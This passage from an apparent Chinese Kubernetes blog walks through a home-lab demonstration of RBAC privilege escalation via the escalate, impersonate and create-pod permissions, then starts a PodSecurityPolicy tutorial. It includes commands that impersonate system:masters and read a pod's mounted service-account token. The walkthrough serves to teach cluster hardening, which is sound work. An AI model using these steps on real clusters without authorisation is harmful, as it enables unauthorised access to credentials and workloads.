class=\"line\">rules:</span><br><span class=\"line\">- apiGroups:</span><br><span class=\"line\">  - rbac.authorization.k8s.io</span><br><span class=\"line\">  resources:</span><br><span class=\"line\">  - roles</span><br><span class=\"line\">  verbs:</span><br><span class=\"line\">  - patch</span><br><span class=\"line\">  - get</span><br><span class=\"line\">- apiGroups:</span><br><span class=\"line\">  - &quot;&quot;</span><br><span class=\"line\">  resources:</span><br><span class=\"line\">  - pods</span><br><span class=\"line\">  verbs:</span><br><span class=\"line\">  - list</span><br><span class=\"line\">- apiGroups:</span><br><span class=\"line\">  - apps</span><br><span class=\"line\">  resources:</span><br><span class=\"line\">  - deployments</span><br><span class=\"line\">  verbs:</span><br><span class=\"line\">  - list</span><br><span class=\"line\"></span><br><span class=\"line\"># 报错，试图提升当前没有的权限，所以即使有了编辑role的权限也没法给role添加新权限。</span><br><span class=\"line\">~$ kl --context=escalatesa edit role escalatesarole</span><br><span class=\"line\">error: roles.rbac.authorization.k8s.io &quot;escalatesarole&quot; could not be patched: roles.rbac.authorization.k8s.io &quot;escalatesarole&quot; is forbidden: user &quot;system:serviceaccount:default:escalatesa&quot; (groups=[&quot;system:serviceaccounts&quot; &quot;system:serviceaccounts:default&quot; &quot;system:authenticated&quot;]) is attempting to grant RBAC permissions not currently held:</span><br><span class=\"line\">&#123;APIGroups:[&quot;apps&quot;], Resources:[&quot;deployments&quot;], Verbs:[&quot;list&quot;]&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"># 现在我们用高权限账户给escalatesarole加上escalate权限</span><br><span class=\"line\">~$ kl edit role escalatesarole</span><br><span class=\"line\"># 添加escalate权限</span><br><span class=\"line\">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class=\"line\">kind: Role</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  creationTimestamp: &quot;2022-02-07T18:56:38Z&quot;</span><br><span class=\"line\">  name: escalatesarole</span><br><span class=\"line\">  namespace: default</span><br><span class=\"line\">  resourceVersion: &quot;1179833&quot;</span><br><span class=\"line\">  uid: 136d44a1-8ca4-45e1-9a26-26cffba876d7</span><br><span class=\"line\">rules:</span><br><span class=\"line\">- apiGroups:</span><br><span class=\"line\">  - rbac.authorization.k8s.io</span><br><span class=\"line\">  resources:</span><br><span class=\"line\">  - roles</span><br><span class=\"line\">  verbs:</span><br><span class=\"line\">  - patch</span><br><span class=\"line\">  - get</span><br><span class=\"line\">  - escalate</span><br><span class=\"line\">- apiGroups:</span><br><span class=\"line\">  - &quot;&quot;</span><br><span class=\"line\">  resources:</span><br><span class=\"line\">  - pods</span><br><span class=\"line\">  verbs:</span><br><span class=\"line\">  - list</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 再次尝试用escalatesarole自身的权限来编辑escalatesarole</span><br><span class=\"line\">~$ kl --context=escalatesa edit role escalatesarole</span><br><span class=\"line\"># 添加deployments的list权限</span><br><span class=\"line\">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class=\"line\">kind: Role</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  creationTimestamp: &quot;2022-02-07T18:56:38Z&quot;</span><br><span class=\"line\">  name: escalatesarole</span><br><span class=\"line\">  namespace: default</span><br><span class=\"line\">  resourceVersion: &quot;1181374&quot;</span><br><span class=\"line\">  uid: 136d44a1-8ca4-45e1-9a26-26cffba876d7</span><br><span class=\"line\">rules:</span><br><span class=\"line\">- apiGroups:</span><br><span class=\"line\">  - rbac.authorization.k8s.io</span><br><span class=\"line\">  resources:</span><br><span class=\"line\">  - roles</span><br><span class=\"line\">  verbs:</span><br><span class=\"line\">  - patch</span><br><span class=\"line\">  - get</span><br><span class=\"line\">  - escalate</span><br><span class=\"line\">- apiGroups:</span><br><span class=\"line\">  - &quot;&quot;</span><br><span class=\"line\">  resources:</span><br><span class=\"line\">  - pods</span><br><span class=\"line\">  verbs:</span><br><span class=\"line\">  - list</span><br><span class=\"line\">- apiGroups:</span><br><span class=\"line\">  - apps</span><br><span class=\"line\">  resources:</span><br><span class=\"line\">  - deployments</span><br><span class=\"line\">  verbs:</span><br><span class=\"line\">  - list</span><br><span class=\"line\">  </span><br><span class=\"line\">这次是可以成功的</span><br><span class=\"line\">role.rbac.authorization.k8s.io/escalatesarole edited</span><br></pre></td></tr></table></figure>\n\n<p>可以看到，有了escalate权限后，就可以编辑role了，即使新增的权限是目前所没有的。同样编辑成功后，再次get deployments等查看其他资源也能成功了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">~$ kl --context=escalatesa get pod</span><br><span class=\"line\">NAME   READY   STATUS    RESTARTS   AGE</span><br><span class=\"line\">......</span><br><span class=\"line\">~$ kl --context=escalatesa get deployments</span><br><span class=\"line\">No resources found in default namespace.</span><br></pre></td></tr></table></figure>\n\n<p>所以啊，escalate权限是很危险的。</p>\n<h2 id=\"impersonate\"><a href=\"#impersonate\" class=\"headerlink\" title=\"impersonate\"></a>impersonate</h2><p>当一个user拥有了impersonate权限后，就可以以其他用户的身份去访问集群，这个权限也是一个veb.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">资料：</span><br><span class=\"line\">https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation</span><br><span class=\"line\">https://docs.bitnami.com/tutorials/simplify-kubernetes-resource-access-rbac-impersonation/</span><br></pre></td></tr></table></figure>\n\n<p>impersonate提升权限的方式是低权限用户以高权限用户的身份去访问集群，测试方法跟上面的一样，查看低权限的用户遇到的问题，然后尝试突破权限。看下面的例子：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 创建测试用得SA，并设置到kubeconfig中去</span><br><span class=\"line\"># 假设当前在default这个namespace， 我们创建sa叫impersonatesa，并给他赋予list pod的权限。</span><br><span class=\"line\"></span><br><span class=\"line\">~$ alias kl=kubectl</span><br><span class=\"line\">~$ kl create sa impersonatesa</span><br><span class=\"line\">serviceaccount/impersonatesa created</span><br><span class=\"line\">~$ kl create role impersonatesarole --verb=list --resource=pod</span><br><span class=\"line\">role.rbac.authorization.k8s.io/impersonatesarole created</span><br><span class=\"line\">~$ kl create rolebinding impersonatesa --serviceaccount=default:impersonatesa --role=impersonatesarole</span><br><span class=\"line\">rolebinding.rbac.authorization.k8s.io/impersonatesa created</span><br><span class=\"line\">~$ kl get secret | grep impersonatesa</span><br><span class=\"line\">impersonatesa-token-tc95p   kubernetes.io/service-account-token   3      34s</span><br><span class=\"line\">~$ TOKEN=$(kl get secret impersonatesa-token-tc95p -o jsonpath=&#x27;&#123;.data.token&#125;&#x27; | base64 -d)</span><br><span class=\"line\">~$ kl config set-credentials impersonatesa --token=$TOKEN</span><br><span class=\"line\">User &quot;impersonatesa&quot; set.</span><br><span class=\"line\">~$ kl config set-context impersonatesa --cluster kubernetes --user impersonatesa</span><br><span class=\"line\">Context &quot;impersonatesa&quot; created.</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">测试权限：</span><br><span class=\"line\"># 能list pod但不能list deployment</span><br><span class=\"line\"></span><br><span class=\"line\">~$ kl --context=impersonatesa get pod</span><br><span class=\"line\">NAME   READY   STATUS    RESTARTS   AGE</span><br><span class=\"line\">......</span><br><span class=\"line\">~$ kl --context=impersonatesa get deployments</span><br><span class=\"line\">Error from server (Forbidden): deployments.apps is forbidden: User &quot;system:serviceaccount:default:impersonatesa&quot; cannot list resource &quot;deployments&quot; in API group &quot;apps&quot; in the namespace &quot;default&quot;</span><br></pre></td></tr></table></figure>\n\n<p>为了能够拥有查看其他资源的权限，我们需要给role impersonatesarole增加list deployments的权限。但这次我们不需要增加权限，我们可以通过别的用户的身份来达到资源访问的目的。我们知道system:masters这个group是有最大权限的，所以如果我们以system:masters这个group来list deployment，那就可以达到目的了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">~$ kl --context=impersonatesa get deployments --as any --as-group system:masters</span><br><span class=\"line\">Error from server (Forbidden): users &quot;any&quot; is forbidden: User &quot;system:serviceaccount:default:impersonatesa&quot; cannot impersonate resource &quot;users&quot; in API group &quot;&quot; at the cluster scope</span><br></pre></td></tr></table></figure>\n\n<p>但是我们看到尝试<code>--as</code>和<code>--as-group</code>的时候失败了，当然他的原因是当前sa没有impersonate权限。所以我们通过高权限账户给impersonatesa增加impersonate权限。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 注意impersonat权限得用clusterrolebinding才行，上面我们从错误信息中也可以看到提示：</span><br><span class=\"line\"># cannot impersonate resource &quot;users&quot; in API group &quot;&quot; at the cluster scope</span><br><span class=\"line\"></span><br><span class=\"line\">~$ kl create clusterrole impersonatesaclusterrole --verb=impersonate --resource=users,groups</span><br><span class=\"line\">clusterrole.rbac.authorization.k8s.io/impersonatesaclusterrole created</span><br><span class=\"line\"></span><br><span class=\"line\">~$ kl create clusterrolebinding impersonatesa --serviceaccount=default:impersonatesa --clusterrole=impersonatesaclusterrole</span><br><span class=\"line\">clusterrolebinding.rbac.authorization.k8s.io/impersonatesa created</span><br></pre></td></tr></table></figure>\n\n<p>我们再来尝试执行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">~$ kl --context=impersonatesa get deployments --as any --as-group system:masters</span><br><span class=\"line\">No resources found in default namespace.</span><br></pre></td></tr></table></figure>\n\n<p>成功了，所以impersonate权限是很危险的。</p>\n<h2 id=\"create-pod\"><a href=\"#create-pod\" class=\"headerlink\" title=\"create pod\"></a>create pod</h2><p>创建pod的权限为什么会存在隐患呢？ 因为创建pod的时候可以配置serviceAccountName，于是这个pod中就可以挂载一个高权限的account，这样就可以在pod中拿到token，就可以拥有高权限了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://www.impidio.com/blog/kubernetes-rbac-security-pitfalls</span><br><span class=\"line\"></span><br><span class=\"line\">Be aware that users with the permission to create pods can escalate their privileges easily. This is because any service account can be provided in the pod specification. The token secret of the selected service account will be mapped into the container and it can be used for API access. So, the create pod privilege implicitly allows to impersonate any service account within the same namespace.</span><br></pre></td></tr></table></figure>\n\n<p>我们创建两个sa，一个有创建pod的权限还有list pod的权限；一个只有list deployments的权限。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">~$ alias kl=kubectl</span><br><span class=\"line\"></span><br><span class=\"line\"># user createpod</span><br><span class=\"line\">~$ kl create sa createpod</span><br><span class=\"line\">serviceaccount/createpod created</span><br><span class=\"line\">~$ kl create role createpodrole --verb=list,create --resource=pod</span><br><span class=\"line\">role.rbac.authorization.k8s.io/createpodrole created</span><br><span class=\"line\">~$ kl create rolebinding createpod --serviceaccount=default:createpod --role=createpodrole</span><br><span class=\"line\">rolebinding.rbac.authorization.k8s.io/createpod created</span><br><span class=\"line\">~$ kl get secret | grep createpod</span><br><span class=\"line\">createpod-token-dl28b       kubernetes.io/service-account-token   3      66s</span><br><span class=\"line\">~$ TOKEN=$(kl get secret createpod-token-dl28b -o jsonpath=&#x27;&#123;.data.token&#125;&#x27; | base64 -d)</span><br><span class=\"line\">~$ kl config set-credentials createpod --token=$TOKEN</span><br><span class=\"line\">User &quot;createpod&quot; set.</span><br><span class=\"line\">~$ kl config set-context createpod --cluster kubernetes --user createpod</span><br><span class=\"line\">Context &quot;createpod&quot; created.</span><br><span class=\"line\"></span><br><span class=\"line\"># user listdeployments</span><br><span class=\"line\">~$ kl create sa listdeployments</span><br><span class=\"line\">serviceaccount/listdeployments created</span><br><span class=\"line\">~$ kl create role listdeploymentsrole --verb=list --resource=deployments</span><br><span class=\"line\">role.rbac.authorization.k8s.io/listdeploymentsrole created</span><br><span class=\"line\">~$ kl create rolebinding listdeployments --serviceaccount=default:listdeployments --role=listdeploymentsrole</span><br><span class=\"line\">rolebinding.rbac.authorization.k8s.io/listdeployments created</span><br></pre></td></tr></table></figure>\n\n<p>测试权限：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 能list pod但不能list deployment</span><br><span class=\"line\"></span><br><span class=\"line\">~$ kl --context=createpod get pod</span><br><span class=\"line\">NAME   READY   STATUS    RESTARTS   AGE</span><br><span class=\"line\">......</span><br><span class=\"line\">~$ kl --context=createpod get deployments</span><br><span class=\"line\">Error from server (Forbidden): deployments.apps is forbidden: User &quot;system:serviceaccount:default:createpod&quot; cannot list resource &quot;deployments&quot; in API group &quot;apps&quot; in the namespace &quot;default&quot;</span><br></pre></td></tr></table></figure>\n\n<p>现在我们尝试使用create pod来突破权限来list deployments.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">vi busy.yaml</span><br><span class=\"line\"># 注意配置serviceAccountName: listdeployments</span><br><span class=\"line\">apiVersion: v1</span><br><span class=\"line\">kind: Pod</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  creationTimestamp: null</span><br><span class=\"line\">  labels:</span><br><span class=\"line\">    run: busy</span><br><span class=\"line\">  name: busy</span><br><span class=\"line\">spec:</span><br><span class=\"line\">  serviceAccountName: listdeployments</span><br><span class=\"line\">  containers:</span><br><span class=\"line\">  - image: busybox</span><br><span class=\"line\">    name: busy</span><br><span class=\"line\">    args:</span><br><span class=\"line\">    - sh</span><br><span class=\"line\">    - -c</span><br><span class=\"line\">    - &quot;sleep 1d&quot;</span><br><span class=\"line\">    resources: &#123;&#125;</span><br><span class=\"line\">  dnsPolicy: ClusterFirst</span><br><span class=\"line\">  restartPolicy: Always</span><br><span class=\"line\">status: &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">~$ kl apply -f busy.yaml</span><br><span class=\"line\">pod/busy created</span><br><span class=\"line\"></span><br><span class=\"line\"># connect to pod</span><br><span class=\"line\">~$ kl exec busy -it -- sh</span><br><span class=\"line\">/ # cat /var/run/secrets/kubernetes.io/serviceaccount/token</span><br><span class=\"line\">...... # 可以看到token是可以获取到的</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 我们离开pod然后记下这个token</span><br><span class=\"line\">~$ TOKEN=$(kl exec busy -it -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)</span><br><span class=\"line\"># 然后同样的方法配置到kubeconfig中去</span><br><span class=\"line\">~$ kl config set-credentials listdeployments --token=$TOKEN</span><br><span class=\"line\">User &quot;listdeployments&quot; set.</span><br><span class=\"line\">~$ kl config set-context listdeployments --cluster kubernetes --user listdeployments</span><br><span class=\"line\">Context &quot;listdeployments&quot; created.</span><br></pre></td></tr></table></figure>\n\n<p>这时候我们再来尝试执行命令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">~$ kl --context=createpod get pod</span><br><span class=\"line\">NAME   READY   STATUS    RESTARTS   AGE</span><br><span class=\"line\">...</span><br><span class=\"line\">~$ kl --context=listdeployments get deployments</span><br><span class=\"line\">No resources found in default namespace.</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>可以看到我们成功list了deployments。所以create pod的权限也是很危险的。</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://yizhi.ren/2022/01/25/setupk8s/\">树莓派搭建k8s集群</a><br><a href=\"https://kubernetes.io/docs/reference/access-authn-authz/rbac/#restrictions-on-role-binding-creation-or-update\">Restrictions on role binding creation or update</a><br><a href=\"https://raesene.github.io/blog/2021/01/16/Getting-Into-A-Bind-with-Kubernetes/\">Getting into a bind with Kubernetes</a><br><a href=\"https://raesene.github.io/blog/2020/12/12/Escalating_Away/\">Escalating Away</a><br><a href=\"https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation\">User impersonation</a><br><a href=\"https://docs.bitnami.com/tutorials/simplify-kubernetes-resource-access-rbac-impersonation/\">Simplify Kubernetes Resource Access Control using RBAC Impersonation</a><br><a href=\"https://www.impidio.com/blog/kubernetes-rbac-security-pitfalls\">Kubernetes RBAC Security Pitfalls</a></p>\n","categories":["架构"],"tags":["kubernetes"]},{"title":"k8s中的PodSecurityPolicy","url":"/2022/02/07/podsecuritypolicy/","content":"<h1 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h1><p>k8s中内置了一种安全策略，能够用来约束pod的行为，他叫PodSecurityPolicy，位于apiserver中，默认被关闭。psp定义了哪些是能做的，他的作用范围大都是在securityContext这个结构中，其他也有，比如可以定义哪些volume是支持的，定义哪些端口是允许的。他通过限制这些结构来达到约束pod的目的。</p>\n<p>但是psp是一个即将被废弃的功能，如果你看到文章的时候k8s的版本已经出到了v1.25了那么你可以不用看这部分了，根据官方文档，psp会在v1.25被彻底拿掉。至于psp的继任者<a href=\"https://kubernetes.io/docs/concepts/security/pod-security-admission/\">Pod Security Admission</a>我会在后续补上，当前我本地安装的k8s版本还不能使用，要v1.22才能使用。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://kubernetes.io/docs/concepts/policy/pod-security-policy/</span><br><span class=\"line\"></span><br><span class=\"line\">PodSecurityPolicy is deprecated as of Kubernetes v1.21, and will be removed in v1.25. It has been replaced by Pod Security Admission. </span><br></pre></td></tr></table></figure>\n\n\n<p>我们来了解一下这个功能，并演示以下如何开启并使用他。</p>\n<span id=\"more\"></span>\n\n<p>以下的操作是基于自己搭建的k8s集群，搭建集群的步骤参考<a href=\"https://yizhi.ren/2022/01/25/setupk8s/\">树莓派搭建k8s集群</a>。</p>\n<h1 id=\"psp为什么废弃\"><a href=\"#psp为什么废弃\" class=\"headerlink\" title=\"psp为什么废弃\"></a>psp为什么废弃</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://kubernetes.io/blog/2021/04/06/podsecuritypolicy-deprecation-past-present-and-future/#why-is-podsecuritypolicy-going-away</span><br><span class=\"line\"></span><br><span class=\"line\">The way PSPs are applied to Pods has proven confusing to nearly everyone that has attempted to use them. It is easy to accidentally grant broader permissions than intended, and difficult to inspect which PSP(s) apply in a given situation. The “changing Pod defaults” feature can be handy, but is only supported for certain Pod settings and it’s not obvious when they will or will not apply to your Pod. Without a “dry run” or audit mode, it’s impractical to retrofit PSP to existing clusters safely, and it’s impossible for PSP to ever be enabled by default.</span><br><span class=\"line\"></span><br><span class=\"line\">psp的授权有两个比较大的问题，一个是除非被明确授予权限，否则默认是没有权限，啥都不能干，这就导致不能随意开启，初始时开启了就没法操作了，而到了线上再开启就很容易影响pod，导致有些pod没有了权限，所以只能初始不开启，然后配置好了，然后开启，然后部署到线上。</span><br><span class=\"line\">另一个问题是psp的授权还依赖RBAC，而RBAC是很间接的，要找到某个service account，再找到相关的role，role中再定义对应的psp，psp中再详细的定义约束，同时如果能找到多个这样role，那么整个路线是这样的：</span><br><span class=\"line\">create pod-&gt;user/sa-&gt;rolebinding1-&gt;role1-&gt;psp1-&gt;psp rules</span><br><span class=\"line\">                   -&gt;rolebinding2-&gt;role2-&gt;psp2-&gt;psp rules</span><br><span class=\"line\">这里我们可以看到找到pod对应的psp，这个路径是又长又冗余的，而pod最终只能选择一个psp，要么psp1要么psp2这就给找到psp规则带来了更大的复杂性。</span><br><span class=\"line\"></span><br><span class=\"line\">所以官方文档中提到的3点，第一点说容易意外的分配过广的权限，这本质是第二个问题的复杂性带来的；</span><br><span class=\"line\">第二点说默认值配置好用，但是对于是否会应用到你的pod这点并不明显，这本质也是第二个问题的复杂性带来的；</span><br><span class=\"line\">第三点说psp没法安全的在现有集群开启并且默认不能开启，这本质是第一个问题带来的。</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"如何使用psp\"><a href=\"#如何使用psp\" class=\"headerlink\" title=\"如何使用psp\"></a>如何使用psp</h1><p>psp用法需要(admission-control enable psp)+(clusterrole/role)+(clusterrolebinding/rolebinding).</p>\n<p>也就是psp需要开关进行使能，同时psp是基于RBAC绑定到user/sa的。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">我们定义3个psp，一个是没权限，一个是部分受约束的权限，一个是全开的权限；然后创建对应的3个clusterrole；然后把受约束的clusterrole绑定给用户组system:authenticated和system:serviceaccounts，同时把全开的权限给kubelet用户；没权限的psp这里不去使用。</span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">~$</span><span class=\"bash\"> vi previleges-psp.yaml</span></span><br><span class=\"line\">apiVersion: policy/v1beta1</span><br><span class=\"line\">kind: PodSecurityPolicy</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  name: no-privilege</span><br><span class=\"line\">spec:</span><br><span class=\"line\">  privileged: false</span><br><span class=\"line\">  seLinux:</span><br><span class=\"line\">    rule: RunAsAny</span><br><span class=\"line\">  supplementalGroups:</span><br><span class=\"line\">    rule: RunAsAny</span><br><span class=\"line\">  runAsUser:</span><br><span class=\"line\">    rule: RunAsAny</span><br><span class=\"line\">  fsGroup:</span><br><span class=\"line\">    rule: RunAsAny</span><br><span class=\"line\">  volumes:</span><br><span class=\"line\">  - &#x27;*&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">---</span><br><span class=\"line\">apiVersion: policy/v1beta1</span><br><span class=\"line\">kind: PodSecurityPolicy</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  name: restrict-privileged</span><br><span class=\"line\">spec:</span><br><span class=\"line\">  privileged: false</span><br><span class=\"line\"><span class=\"meta\">  #</span><span class=\"bash\"> Required to prevent escalations to root.</span></span><br><span class=\"line\">  allowPrivilegeEscalation: false</span><br><span class=\"line\">  requiredDropCapabilities:</span><br><span class=\"line\">    - ALL</span><br><span class=\"line\"><span class=\"meta\">  #</span><span class=\"bash\"> Allow core volume types.</span></span><br><span class=\"line\">  volumes:</span><br><span class=\"line\">    - &#x27;configMap&#x27;</span><br><span class=\"line\">    - &#x27;emptyDir&#x27;</span><br><span class=\"line\">    - &#x27;projected&#x27;</span><br><span class=\"line\">    - &#x27;secret&#x27;</span><br><span class=\"line\">    - &#x27;downwardAPI&#x27;</span><br><span class=\"line\">    # Assume that ephemeral CSI drivers &amp; persistentVolumes set up by the cluster admin are safe to use.</span><br><span class=\"line\">    - &#x27;csi&#x27;</span><br><span class=\"line\">    - &#x27;persistentVolumeClaim&#x27;</span><br><span class=\"line\">    - &#x27;ephemeral&#x27;</span><br><span class=\"line\">  hostNetwork: false</span><br><span class=\"line\">  hostIPC: false</span><br><span class=\"line\">  hostPID: false</span><br><span class=\"line\">  runAsUser:</span><br><span class=\"line\">    # Require the container to run without root privileges.</span><br><span class=\"line\">    rule: &#x27;MustRunAsNonRoot&#x27;</span><br><span class=\"line\">  seLinux:</span><br><span class=\"line\">    # This policy assumes the nodes are using AppArmor rather than SELinux.</span><br><span class=\"line\">    rule: &#x27;RunAsAny&#x27;</span><br><span class=\"line\">  supplementalGroups:</span><br><span class=\"line\">    rule: &#x27;MustRunAs&#x27;</span><br><span class=\"line\">    ranges:</span><br><span class=\"line\">      # Forbid adding the root group.</span><br><span class=\"line\">      - min: 1</span><br><span class=\"line\">        max: 65535</span><br><span class=\"line\">  fsGroup:</span><br><span class=\"line\">    rule: &#x27;MustRunAs&#x27;</span><br><span class=\"line\">    ranges:</span><br><span class=\"line\">      # Forbid adding the root group.</span><br><span class=\"line\">      - min: 1</span><br><span class=\"line\">        max: 65535</span><br><span class=\"line\">  readOnlyRootFilesystem: false</span><br><span class=\"line\"></span><br><span class=\"line\">---</span><br><span class=\"line\">apiVersion: policy/v1beta1</span><br><span class=\"line\">kind: PodSecurityPolicy</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  name: privileged</span><br><span class=\"line\">spec:</span><br><span class=\"line\">  privileged: true</span><br><span class=\"line\">  allowPrivilegeEscalation: true</span><br><span class=\"line\">  allowedCapabilities:</span><br><span class=\"line\">  - &#x27;*&#x27;</span><br><span class=\"line\">  volumes:</span><br><span class=\"line\">  - &#x27;*&#x27;</span><br><span class=\"line\">  hostNetwork: true</span><br><span class=\"line\">  hostPorts:</span><br><span class=\"line\">  - min: 0</span><br><span class=\"line\">    max: 65535</span><br><span class=\"line\">  hostIPC: true</span><br><span class=\"line\">  hostPID: true</span><br><span class=\"line\">  runAsUser:</span><br><span class=\"line\">    rule: &#x27;RunAsAny&#x27;</span><br><span class=\"line\">  seLinux:</span><br><span class=\"line\">    rule: &#x27;RunAsAny&#x27;</span><br><span class=\"line\">  supplementalGroups:</span><br><span class=\"line\">    rule: &#x27;RunAsAny&#x27;</span><br><span class=\"line\">  fsGroup:</span><br><span class=\"line\">    rule: &#x27;RunAsAny&#x27;</span><br><span class=\"line\">  allowedHostPaths:</span><br><span class=\"line\">  - pathPrefix: &quot;/&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">---</span><br><span class=\"line\">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class=\"line\">kind: ClusterRole</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  name: no-previlege-psp-clusterrole</span><br><span class=\"line\">rules:</span><br><span class=\"line\">- apiGroups: [&#x27;policy&#x27;]</span><br><span class=\"line\">  resources: [&#x27;podsecuritypolicies&#x27;]</span><br><span class=\"line\">  verbs:     [&#x27;use&#x27;]</span><br><span class=\"line\">  resourceNames:</span><br><span class=\"line\">  - no-privilege</span><br><span class=\"line\">---</span><br><span class=\"line\">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class=\"line\">kind: ClusterRole</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  name: restrict-previleged-psp-clusterrole</span><br><span class=\"line\">rules:</span><br><span class=\"line\">- apiGroups: [&#x27;policy&#x27;]</span><br><span class=\"line\">  resources: [&#x27;podsecuritypolicies&#x27;]</span><br><span class=\"line\">  verbs:     [&#x27;use&#x27;]</span><br><span class=\"line\">  resourceNames:</span><br><span class=\"line\">  - restrict-privileged</span><br><span class=\"line\">---</span><br><span class=\"line\">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class=\"line\">kind: ClusterRole</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  name: previleged-psp-clusterrole</span><br><span class=\"line\">rules:</span><br><span class=\"line\">- apiGroups: [&#x27;policy&#x27;]</span><br><span class=\"line\">  resources: [&#x27;podsecuritypolicies&#x27;]</span><br><span class=\"line\">  verbs:     [&#x27;use&#x27;]</span><br><span class=\"line\">  resourceNames:</span><br><span class=\"line\">  - privileged</span><br><span class=\"line\">---</span><br><span class=\"line\">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class=\"line\">kind: ClusterRoleBinding</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  name: previleged-psp-binding</span><br><span class=\"line\">roleRef:</span><br><span class=\"line\">  kind: ClusterRole</span><br><span class=\"line\">  name: previleged-psp-clusterrole</span><br><span class=\"line\">  apiGroup: rbac.authorization.k8s.io</span><br><span class=\"line\">subjects:</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> Authorize all kubelet:</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> https://github.com/kubernetes/kubernetes/blob/a1513161b3056d4c5ef711ab1c5314e97e90811a/cluster/gce/addons/podsecuritypolicies/node-binding.yaml</span></span><br><span class=\"line\">- kind: Group</span><br><span class=\"line\">  apiGroup: rbac.authorization.k8s.io</span><br><span class=\"line\">  name: system:nodes</span><br><span class=\"line\">- kind: User</span><br><span class=\"line\">  apiGroup: rbac.authorization.k8s.io</span><br><span class=\"line\"><span class=\"meta\">  #</span><span class=\"bash\"> Legacy node ID</span></span><br><span class=\"line\">  name: kubelet</span><br><span class=\"line\"></span><br><span class=\"line\">---</span><br><span class=\"line\">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class=\"line\">kind: ClusterRoleBinding</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  name: restrict-previleged-psp-binding</span><br><span class=\"line\">roleRef:</span><br><span class=\"line\">  kind: ClusterRole</span><br><span class=\"line\">  name: restrict-previleged-psp-clusterrole</span><br><span class=\"line\">  apiGroup: rbac.authorization.k8s.io</span><br><span class=\"line\">subjects:</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> Authorize all service accounts:</span></span><br><span class=\"line\">- kind: Group</span><br><span class=\"line\">  apiGroup: rbac.authorization.k8s.io</span><br><span class=\"line\">  name: system:serviceaccounts</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> all authenticated users:</span></span><br><span class=\"line\">- kind: Group</span><br><span class=\"line\">  apiGroup: rbac.authorization.k8s.io</span><br><span class=\"line\">  name: system:authenticated</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 然后apply</span></span><br><span class=\"line\"><span class=\"meta\">~$</span><span class=\"bash\"> kl apply -f previleges-psp.yaml</span> </span><br><span class=\"line\">Warning: policy/v1beta1 PodSecurityPolicy is deprecated in v1.21+, unavailable in v1.25+</span><br><span class=\"line\">podsecuritypolicy.policy/no-privilege created</span><br><span class=\"line\">podsecuritypolicy.policy/restrict-privileged created</span><br><span class=\"line\">podsecuritypolicy.policy/privileged created</span><br><span class=\"line\">clusterrole.rbac.authorization.k8s.io/no-previlege-psp-clusterrole created</span><br><span class=\"line\">clusterrole.rbac.authorization.k8s.io/restrict-previleged-psp-clusterrole created</span><br><span 